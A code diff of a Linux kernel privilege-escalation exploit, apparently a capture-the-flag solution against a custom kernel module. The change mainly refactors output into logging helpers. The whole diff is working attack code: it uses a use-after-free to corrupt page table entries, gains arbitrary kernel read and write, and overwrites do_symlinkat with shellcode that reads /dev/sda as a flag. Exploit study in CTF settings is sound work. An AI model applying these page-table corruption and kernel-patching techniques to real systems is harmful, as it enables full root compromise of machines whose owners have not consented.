@@ -1,8 +1,10 @@
 #include "libs/pwn.h"
 #include "linux6.6.22/shellcode.h"
+#include <stdlib.h>
 #include <sys/sendfile.h>
 #include <sched.h>
 #include <sys/wait.h>
+#include <unistd.h>
 
 /*******************************
  * EXPLOIT                     *
@@ -13,19 +15,24 @@
  * this version overwrites do_symlinkat with privilige escalation shellcode
  */
 
+ // can't call logging helpers directly
+ //  BUG: Bad page cache in process pwn  pfn:02850
+
 int fd, dmafd, ezfd = -1;
 static void win() {
-  char buf[0x100];
+  char buf[0x100] = {0};
   int fd = open("/dev/sda", O_RDONLY);
   if (fd < 0) {
-    puts("[-] Lose...");
+    puts(LERROR "Lose...");
+    exit(EXIT_FAILURE);
   } else {
-    puts("[+] Win!");
+    puts(LINFO "Win!");
     read(fd, buf, 0x100);
-    write(1, buf, 0x100);
-    puts("[+] Done");
+    fputs(LINFO "flag: ", stdout);
+    fputs(buf, stdout);
+    puts(LINFO "Done");
   }
-  exit(0);
+  exit(EXIT_SUCCESS);
 }
 
 uint64_t user_cs, user_ss, user_rsp, user_rflags;
@@ -51,21 +58,23 @@ int main(int argc, char* argv[]) {
   char leak[PTE_SIZE] = {0};
   char *spray[N_SPRAY];
 
-  puts("[+] INIT");
+  lstage("INIT");
   pin_cpu(0, 0);
   save_state();
   init();
-  
+
+  lstage("START");
+
   for (int i = 0; i < N_SPRAY; i++)
     spray[i] = mmap((void*)(0xdead000000 + i*0x10000), 0x8000,
              PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, -1, 0);
 
-  puts("[+] create dangeling ptr");
-  ptr = keap_malloc(PTE_SIZE, GFP_KERNEL_ACCOUNT); 
+  linfo("create dangeling ptr");
+  ptr = keap_malloc(PTE_SIZE, GFP_KERNEL_ACCOUNT);
   keap_write(ptr, leak, PTE_SIZE);
   keap_free(ptr);
 
-  puts("[+] spray PTEs");
+  linfo("spray PTEs");
   for (int i = 0; i < N_SPRAY; i++)
     for (int j = 0; j < 8; j++)
       *(uint64_t*)(spray[i] + j*0x1000) = 0x6fe1be2;
@@ -78,12 +87,12 @@ int main(int argc, char* argv[]) {
   keap_read(ptr, &pte, 0x8);
   CHK((char)pte == 0x67);
 
-  puts("[+] corrupt PTE using UAF with fixed physical address");
+  linfo("corrupt PTE using UAF with fixed physical address");
   // fixed physical address
   pte = 0x800000000009c067;
   keap_write(ptr, &pte, 0x8);
 
-  puts("[+] find corrupted page");
+  linfo("find corrupted page");
   void *vuln = 0;
   uint64_t physbase = 0;
   for (int i = 0; i < N_SPRAY; i ++) {
@@ -100,9 +109,9 @@ int main(int argc, char* argv[]) {
 
   CHK(physbase);
 
-  printf("[+] physbase = 0x%lx\n", physbase);
+  linfo("physbase = 0x%lx\n", physbase);
 
-  puts("[+] corrupt PTE into AAW/AAR");
+  linfo("corrupt PTE into AAW/AAR");
   // grep do_symlinkat /proc/kallsyms
   // 0xffffffff811bbe10
   uint64_t do_symlinkat_func = 0x11bbe10;
@@ -138,7 +147,8 @@ int main(int argc, char* argv[]) {
   print_hex(leak, 0x80);
 #endif
 
-  puts("[+] preparing shellcode");
+  lstage("PRIVESC");
+  linfo("preparing shellcode");
   void *p;
   p = memmem(shellcode, sizeof(shellcode), "\x22\x22\x22\x22\x22\x22\x22\x22", 8);
   *(size_t*)p = (size_t)&win;
@@ -147,10 +157,10 @@ int main(int argc, char* argv[]) {
   p = memmem(shellcode, sizeof(shellcode), "\x55\x55\x55\x55\x55\x55\x55\x55", 8);
   *(size_t*)p = user_rsp;
 
-  puts("[+] overwriting do_symlinkat_at");
+  linfo("overwriting do_symlinkat_at");
   memcpy(vuln + (do_symlinkat_func & 0xfff), shellcode, sizeof(shellcode));
 
-  printf("%d\n", symlink("/jail/x", "/jail"));
-  puts("[-] Failed...");
+  linfo("%d", symlink("/jail/x", "/jail"));
+  lerror("Failed...");
 
 }
